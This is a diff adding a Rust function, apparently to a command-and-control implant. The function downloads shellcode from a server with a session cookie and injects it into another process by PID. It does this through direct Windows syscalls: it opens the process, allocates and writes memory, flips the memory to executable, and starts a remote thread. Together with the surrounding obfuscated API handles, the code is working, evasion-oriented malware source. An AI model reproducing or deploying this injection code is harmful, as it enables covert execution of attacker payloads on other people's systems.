@@ -277,6 +277,119 @@ pub mod command {
         lc!("Shellcode successfully executed")
     }
 
+    pub fn shellcode_inject_sys(
+        base_url: &str,
+        cookie_header: &reqwest::header::HeaderValue,
+        file_name: &str,
+        target_pid: u32,
+        memory_permissions: &str,
+        kernel32: &obf_kernel32,
+        ntdll: &obf_ntdll,
+    ) -> String {
+        // Get the file off the server
+        let file_vec = get_file_vec(base_url, file_name, cookie_header);
+
+        let file_bytes: &[u8] = &file_vec;
+        let file_bytes_v: *const c_void = file_bytes.as_ptr().cast();
+        let mut file_size = file_bytes.len();
+
+        unsafe {
+            
+            let mut c_id = windows_sys::Win32::System::WindowsProgramming::CLIENT_ID {
+                UniqueProcess: target_pid as isize,
+                UniqueThread: 0
+            };
+
+            let mut zoa:  windows_sys::Win32::System::WindowsProgramming::OBJECT_ATTRIBUTES = std::mem::zeroed();
+            let mut handle:isize  = 0;
+
+            syscall!(
+                "NtOpenProcess",
+                &mut handle as *mut _,
+                PROCESS_CREATE_THREAD
+                    | PROCESS_QUERY_INFORMATION
+                    | PROCESS_VM_OPERATION
+                    | PROCESS_VM_READ
+                    | PROCESS_VM_WRITE,
+                &mut zoa as *mut _,
+                &c_id as *const _  
+            );
+
+            let mut dest: *mut c_void = null_mut();
+
+            // If specified to use RW memory, allocate, copy, change to RX, execute
+            if memory_permissions == "RX" {
+                let mut old_perms = PAGE_READWRITE;
+
+                syscall!(
+                    "NtAllocateVirtualMemory",
+                    handle,
+                    &mut dest,
+                    0,
+                    &mut file_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_READWRITE
+                );
+                syscall!(
+                    "NtWriteVirtualMemory",
+                    handle,
+                    dest,
+                    file_bytes_v,
+                    file_size,
+                    0
+                );
+                syscall!(
+                    "NtProtectVirtualMemory",
+                    handle,
+                    &mut dest,
+                    &mut file_size,
+                    PAGE_EXECUTE_READ,
+                    &mut old_perms
+                );
+                
+            } else {
+                // Allocate inside of the target pid process
+                syscall!(
+                    "NtAllocateVirtualMemory",
+                    handle,
+                    &mut dest,
+                    0,
+                    &mut file_size,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_EXECUTE_READWRITE
+                );
+                syscall!(
+                    "NtWriteVirtualMemory",
+                    handle,
+                    dest,
+                    file_bytes_v,
+                    file_size,
+                    0
+                );   
+            }
+
+            let mut hThread: isize = 0;
+
+            syscall!(
+                "NtCreateThreadEx",
+                &mut hThread,
+                GENERIC_EXECUTE,
+                null::<*mut c_void>(),
+                handle,
+                dest,
+                dest,
+                FALSE,
+                null::<*mut c_void>(),
+                null::<*mut c_void>(),
+                null::<*mut c_void>(),
+                null::<*mut c_void>()
+            );
+
+            syscall!("NtClose", hThread);
+        }
+        lc!("Shellcode successfully executed")
+    }
+
     pub fn shellcode_earlybird(
         base_url: &str,
         cookie_header: &reqwest::header::HeaderValue,
